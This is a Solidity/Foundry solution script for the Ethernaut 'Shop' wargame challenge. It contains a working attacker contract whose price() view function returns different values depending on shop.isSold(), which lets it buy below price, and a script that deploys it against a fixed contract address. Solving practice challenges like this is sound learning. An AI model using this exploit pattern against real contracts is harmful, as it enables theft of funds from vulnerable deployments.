// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Shop} from "../src/Shop.sol";

contract Attacker {
    
    Shop shop;
    constructor(address _address) {
        shop = Shop(_address);
    }

    function shopNow() external {
        shop.buy();
    }

    function price() external view returns (uint256) {
        return shop.isSold() ? 1 : 100;
    }

}

/// @author agadzhalov
/// @title Solution to Shop Ethernaut challenge
/// @notice Solution: 
///         Buyer(msg.sender) - We can deploy a malicious contract and execute the transaction on its behalf.
///         price() - Since it's a view function, we can't change the state directly within it.
///         By default, `isSold` is `false`, which means `!isSold` is initially `true`.
///         Thus, when we check `price()` for the first time, it should return 100, and on the second check,
///         it should return 1. To achieve this, we can utilize `shop.isSold()`.
contract ShopScript is Script {

    Shop private shop = Shop(0x727a087fEc48C4189618D54Ff0f96125e88cF1C1);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Deploy the Attacker contract with the Shop contract address as a parameter
        Attacker attacker = new Attacker(address(shop));

        // Execute the shopNow function in the Attacker contract to manipulate the Shop contract     
        attacker.shopNow();
        
        vm.stopBroadcast();
    }
}
